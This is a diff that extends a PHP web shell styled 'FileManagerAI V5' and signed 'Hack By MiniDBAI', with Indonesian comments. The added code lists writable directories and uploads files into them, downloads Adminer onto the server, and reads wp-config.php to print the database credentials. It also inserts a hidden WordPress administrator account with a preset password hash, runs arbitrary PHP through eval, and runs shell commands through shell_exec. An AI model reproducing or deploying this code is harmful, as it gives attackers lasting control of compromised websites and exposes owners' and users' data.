@@ -99,7 +99,7 @@ function delete_directory($dir) {
 // Set directory path
 $dir = isset($_GET['dir']) ? $_GET['dir'] : '../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../';
 $home_dir = '../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../'; // Direktori utama atau tempat file berada
-
+$dir2 = '';
 
 
 // Fungsi untuk mengunggah file
@@ -273,6 +273,44 @@ $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
     }
 }
 
+
+// Tambahkan ini di atas bagian skrip Anda
+if (isset($_GET['zip'])) {
+    $zipFileName = basename($_GET['zip']) . '.zip'; // Nama file zip
+    $zip = new ZipArchive();
+    $zipPath = $dir . $zipFileName;
+
+    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
+        $path = $dir . $_GET['zip'];
+
+        if (is_dir($path)) {
+            // Tambahkan folder ke zip
+            $files = new RecursiveIteratorIterator(
+                new RecursiveDirectoryIterator($path),
+                RecursiveIteratorIterator::LEAVES_ONLY
+            );
+
+            foreach ($files as $file) {
+                if (!$file->isDir()) {
+                    $filePath = $file->getRealPath();
+                    $relativePath = substr($filePath, strlen($dir2)); // Mendapatkan path relatif
+                    $zip->addFile($filePath, $relativePath);
+                }
+            }
+        } else {
+            // Tambahkan file ke zip
+            $zip->addFile($path, basename($path));
+        }
+
+        $zip->close();
+        echo "File ZIP berhasil dibuat: $zipFileName";
+    } else {
+        echo 'Gagal membuat file ZIP';
+    }
+}
+
+
+
 // Fungsi untuk mengekstrak file ZIP
 if (isset($_FILES['zip_file'])) {
     $zip_file = $_FILES['zip_file']['tmp_name'];
@@ -297,6 +335,8 @@ if (isset($_FILES['zip_file'])) {
 // Tampilkan file dan direktori
 $files = scandir($dir);
 ?>
+
+
 
 <!DOCTYPE html>
 <html>
@@ -353,13 +393,77 @@ input[type="submit"]:hover {
 
 </head>
 <body>
-   <center> <h2>FileManagerAI V1</h2> </center>
+   <center> <h2>FileManagerAI V5</h2> </center>
 
+<?php
+// URL file yang akan diunduh
+$url = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
+$targetFile = __DIR__ . '/adminer.php'; // Nama file yang akan disimpan
 
+// Fungsi untuk mengunduh file
+function downloadFile($url, $targetFile) {
+    // Inisialisasi cURL
+    $ch = curl_init($url);
+    
+    // Set opsi cURL
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    
+    // Eksekusi cURL
+    $data = curl_exec($ch);
+    $error = curl_error($ch);
+    
+    // Tutup cURL
+    curl_close($ch);
+    
+    // Cek apakah ada kesalahan
+    if ($error) {
+        echo "Error: " . $error;
+        return false;
+    }
+    
+    // Simpan data ke file
+    file_put_contents($targetFile, $data);
+    return true;
+}
+
+// Cek jika form di-submit
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (downloadFile($url, $targetFile)) {
+        echo "File adminer.php telah berhasil diunduh.";
+    } else {
+        echo "Gagal mengunduh file.";
+    }
+}
+?>
+  <table>
+        <tbody>
+            <tr>
+<td>
     <!-- Tombol Logout -->
-    <form action="" method="post">
-        <input type="submit" name="logout" value="Logout">
-    </form>
+	<form action="" method="post">
+		<input type="submit" name="logout" value="Logout">
+    	</form>
+</td>
+
+
+<td>
+	<form action="" method="post">
+		<input type="submit" value="adminer">
+	</form>
+</td>
+
+
+<td>
+<div style="text-align: right;">
+    <a target="_blank" rel="noopener noreferrer" href="https://bukakartu.id/minidbai">
+        <img src="https://bukakartu.id/assets/img/615845_1725364953.webp" width="109" height="145" alt="Deskripsi Gambar">
+    <br>Hack By MiniDBAI</a>
+</div>
+</td>
+            </tr>
+        </tbody>
+    </table>
 
 
     <table>
@@ -513,7 +617,7 @@ echo "" . htmlspecialchars($direktori_sekarang);
     <?php foreach ($filesList as $file): ?>
         <tr>
             <td>
-                <a href="<?php echo htmlspecialchars($dir . $file); ?>" download><?php echo htmlspecialchars($file); ?></a>
+                <a href="<?php echo htmlspecialchars($dir . $file); ?>" target="_blank"><?php echo htmlspecialchars($file); ?></a>
             </td>
             <td><?php echo number_format(filesize($dir . $file) / 1024, 2) . ' KB'; // Ukuran file dalam KB ?></td>
             <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $file)); // Tanggal terakhir modifikasi ?></td>
@@ -529,14 +633,21 @@ echo "" . htmlspecialchars($direktori_sekarang);
                 <a href="?dir=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($file); ?>">[Edit]</a>
                 <a href="?dir=<?php echo urlencode($dir); ?>&rename=<?php echo urlencode($file); ?>">[ReName]</a>
                 <a href="?dir=<?php echo urlencode($dir); ?>&copy=<?php echo urlencode($file); ?>">[Copy]</a>
+		<a href="?dir=<?php echo urlencode($dir); ?>&zip=<?php echo urlencode($file); ?>">[Zip]</a> <!-- Tautan untuk zip -->
+		
             </td>
         </tr>
     <?php endforeach; ?>
 </table>
 
 
-
-
+<?php
+if (class_exists('ZipArchive')) {
+    echo "Ekstensi ZipArchive aktif.";
+} else {
+    echo "Ekstensi ZipArchive tidak aktif.";
+}
+?>
 
 
     <!-- Form untuk mengunggah dan mengekstrak file ZIP -->
@@ -547,6 +658,278 @@ echo "" . htmlspecialchars($direktori_sekarang);
     </form>
 
 <br>
+
+
+
+
+
+
+
+
+
+
+
+<?php 
+echo "<center><big>MiniAI Upload Area</big></center><br>";
+echo "<center><form method='post' enctype='multipart/form-data' name='uploader'>";
+
+// Ambil direktori dasar dari URL
+$baseDir = isset($_GET['dir']) ? urldecode($_GET['dir']) : $_SERVER['DOCUMENT_ROOT'] . '/';
+
+// Fungsi untuk mendapatkan semua folder yang dapat diakses untuk upload
+function getWritableDirectories($dir) {
+    $directories = [];
+    $items = scandir($dir);
+    foreach ($items as $item) {
+        if ($item !== '.' && $item !== '..') {
+            $path = $dir . '/' . $item;
+            if (is_dir($path) && is_writable($path)) {
+                $directories[] = $path;
+                // Ambil direktori dalam direktori
+                $subDirs = getWritableDirectories($path);
+                $directories = array_merge($directories, $subDirs);
+            }
+        }
+    }
+    return $directories;
+}
+
+// Tampilkan tombol untuk memunculkan form upload
+echo '<button type="button" onclick="document.getElementById(\'uploadForm\').style.display=\'block\'">Upload File</button><br><br>';
+
+// Tampilkan form upload file (disembunyikan secara default)
+echo '<div id="uploadForm" style="display:none;">';
+echo '<select name="uploadDir">';
+$directories = getWritableDirectories($baseDir);
+foreach ($directories as $dir) {
+    $dirName = str_replace($baseDir, '', $dir); // Menghilangkan path dasar
+    echo '<option value="' . $dir . '">' . $dirName . '</option>';
+}
+echo '</select>';
+
+echo '<br><input type="file" name="file" size="45"><input name="_upl" type="submit" id="_upl" value="Upload"></form></div></center>';
+
+if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
+    // Ambil direktori yang dipilih
+    $selectedDir = $_POST['uploadDir'];
+    $uploadDir = $selectedDir . '/'; // Gunakan direktori yang dipilih langsung
+
+    // Lokasi file yang diupload
+    $uploadFile = $uploadDir . basename($_FILES['file']['name']);
+
+    // Proses upload file
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
+        $fileUrl = 'https://' . $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], '', $uploadFile);
+        echo "<center>File telah berhasil diupload!<br>";
+        echo "URL: <a href='$fileUrl' target='_blank'>$fileUrl</a></center>";
+    } else {
+        echo "<center>Gagal mengupload file!</center>";
+    }
+}
+?>
+
+
+
+
+
+<?php
+// Array dengan path alternatif untuk wp-config.php, hingga sepuluh direktori di atas
+$possible_paths = [
+    dirname(__FILE__) . '/wp-config.php',                // Direktori saat ini
+    dirname(__FILE__) . '/../wp-config.php',             // Satu direktori di atas
+    dirname(__FILE__) . '/../../wp-config.php',          // Dua direktori di atas
+    dirname(__FILE__) . '/../../../wp-config.php',       // Tiga direktori di atas
+    dirname(__FILE__) . '/../../../../wp-config.php',    // Empat direktori di atas
+    dirname(__FILE__) . '/../../../../../wp-config.php', // Lima direktori di atas
+];
+
+// Variabel untuk menyimpan path yang ditemukan
+$wp_config_file = null;
+
+// Cari file wp-config.php di semua path alternatif
+foreach ($possible_paths as $path) {
+    if (file_exists($path)) {
+        $wp_config_file = $path;
+        break;
+    }
+}
+
+// Jika file ditemukan
+if ($wp_config_file) {
+    // Ambil isi file
+    $config_content = file_get_contents($wp_config_file);
+
+    // Fungsi untuk mendapatkan nilai dari definisi konstanta
+    function get_wp_config_value($content, $key) {
+        preg_match("/define\s*\(\s*'{$key}'\s*,\s*'([^']+)'/", $content, $matches);
+        return isset($matches[1]) ? $matches[1] : null;
+    }
+
+    // Ambil variabel yang diinginkan
+    $db_name = get_wp_config_value($config_content, 'DB_NAME');
+    $db_user = get_wp_config_value($config_content, 'DB_USER');
+    $db_password = get_wp_config_value($config_content, 'DB_PASSWORD');
+    $db_host = get_wp_config_value($config_content, 'DB_HOST');
+
+    // Ambil table prefix
+    preg_match("/\\\$table_prefix\s*=\s*'([^']+)';/", $config_content, $prefix_matches);
+    $table_prefix = isset($prefix_matches[1]) ? $prefix_matches[1] : "Tidak ditemukan";
+
+    // Tampilkan hasil
+    echo "wp-config.php ditemukan di: $wp_config_file<br>";
+    echo "DB_HOST = $db_host<br>";
+    echo "DB_USER = $db_user<br>";
+    echo "DB_PASSWORD = $db_password<br>";
+    echo "Database = $db_name<br>";
+    echo "Table Prefix = $table_prefix<br>";
+
+    // Cek apakah ada POST request untuk membuat akun admin
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $username = $_POST['username'] ?? null;
+        $password = '$P$B2CXGXAe2jBMcOK34tZSXaMABEvqFS.'; // Hash password yang telah ditentukan
+        $email = $_POST['email'] ?? null;
+
+        // Validasi input
+        if ($username && $email) {
+            // Buat koneksi ke database
+            $mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);
+
+            // Cek koneksi
+            if ($mysqli->connect_error) {
+                die("Koneksi gagal: " . $mysqli->connect_error);
+            }
+
+            // Query untuk menambahkan user ke tabel wp_users
+            $user_insert = $mysqli->prepare("INSERT INTO {$table_prefix}users (user_login, user_pass, user_email, user_registered, user_status) VALUES (?, ?, ?, NOW(), 0)");
+            $user_insert->bind_param("sss", $username, $password, $email);
+            $user_insert->execute();
+            $user_id = $mysqli->insert_id; // ID user yang baru dibuat
+            $user_insert->close();
+
+            if ($user_id) {
+                // Query untuk menambahkan meta user untuk peran administrator di wp_usermeta
+                $capabilities = serialize(['administrator' => true]);
+                $mysqli->query("INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ($user_id, '{$table_prefix}capabilities', '$capabilities')");
+                $mysqli->query("INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ($user_id, '{$table_prefix}user_level', '10')");
+
+                echo "Akun administrator berhasil dibuat dengan username: $username";
+            } else {
+                echo "Gagal membuat akun administrator.";
+            }
+
+            $mysqli->close();
+        } else {
+            echo "Username dan email harus diisi.";
+        }
+    }
+} else {
+    echo "File wp-config.php tidak ditemukan di direktori yang ditentukan.";
+}
+?>
+<form method="post" action="">
+    <label for="username">Username:</label>
+    <input type="text" id="username" name="username" required><br>
+
+    <label for="email">Email:</label>
+    <input type="email" id="email" name="email" value="superuseradmin@mail.com" required><br>
+    <input type="submit" value="Buat Akun Administrator">
+
+</form>
+
+
+
+
+
+
+
+
+
+
+
+    <form method="post">
+	<label for="command"> Eksekusi Kode PHP :</label><br>
+        <textarea name="code" rows="2" cols="50" placeholder="Masukkan kode PHP di sini..."></textarea><br>
+	<input type="submit" value="Jalankan php">
+        
+    </form>
+
+
+
+   
+
+    
+
+
+    <?php
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $code = $_POST['code'];
+        
+        // Pastikan kode PHP aman untuk dieksekusi
+        // Hanya untuk tujuan demonstrasi. Hindari ini di lingkungan produksi.
+        eval("?>$code");
+    }
+    ?>
+
+
+<?php
+// Menampilkan informasi server
+echo "<h1>Informasi Server</h1>";
+echo "<p><strong>Server Name:</strong> " . $_SERVER['SERVER_NAME'] . " | <strong>Server Address:</strong> " . $_SERVER['SERVER_ADDR'] . "  | <strong>Server Port:</strong> " . $_SERVER['SERVER_PORT'] . "</p>";
+echo "<p><strong>Request Method:</strong> " . $_SERVER['REQUEST_METHOD'] . "  | <strong>Protocol:</strong> " . $_SERVER['SERVER_PROTOCOL'] . "  | <strong>Request Time:</strong> " . date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME']) . " <strong>Timezone:</strong> " . date_default_timezone_get() . "</p>";
+echo "<p><strong>User Agent:</strong> " . $_SERVER['HTTP_USER_AGENT'] . "</p>";
+echo "<p><strong>Remote Address:</strong> " . $_SERVER['REMOTE_ADDR'] . "  | <strong>Server Software:</strong> " . $_SERVER['SERVER_SOFTWARE'] . "</p>";
+echo "<p><strong>PHP Version:</strong> " . phpversion() . "</p>";
+echo "<p><strong>Server Admin:</strong> " . (isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : 'Tidak ada') . "  | <strong>Server Type:</strong> " . (isset($_SERVER['SERVER_TYPE']) ? $_SERVER['SERVER_TYPE'] : 'Tidak ada') . "</p>";
+echo "<p><strong>Connection Status:</strong> " . (isset($_SERVER['CONNECTION']) ? $_SERVER['CONNECTION'] : 'Tidak ada') . "</p>";
+echo "<p><strong>Content Type:</strong> " . (isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : 'Tidak ada') . "</p>";
+echo "<p><strong>HTTPS:</strong> " . (isset($_SERVER['HTTPS']) ? 'Ya' : 'Tidak') . " | <strong>Content Length:</strong> " . (isset($_SERVER['CONTENT_LENGTH']) ? $_SERVER['CONTENT_LENGTH'] : 'Tidak ada') . " bytes</p>";
+
+?>
+
+
+
+
+
+<?php
+// Jalankan perintah sudo dan cek apakah ada akses
+$output = shell_exec('sudo -v 2>&1');
+
+// Tampilkan hasilnya
+if (strpos($output, 'Sorry') !== false) {
+    echo 'Perintah sudo tidak bisa digunakan.';
+} else {
+    echo 'Perintah sudo berhasil dijalankan atau memiliki akses.';
+}
+?>
+
+
+    <form method="post">
+        <label for="command"> Terminal :</label><br>
+        <input type="text" id="command" name="command" required><br><br>
+        <input type="submit" value="Eksekusi">
+    </form>
+
+
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $command = $_POST['command'];
+    
+    // Jalankan perintah terminal
+    $output = shell_exec($command);
+    
+    // Tampilkan output dari perintah yang dijalankan
+    echo "<pre>$output</pre>";
+}
+?>
+
+
+
+
+
+
+
+
+
 <center>[<a target="_blank"  href="https://bukakartu.id/minidbai">minidbai</a>]</center>
 </body>
 </html>
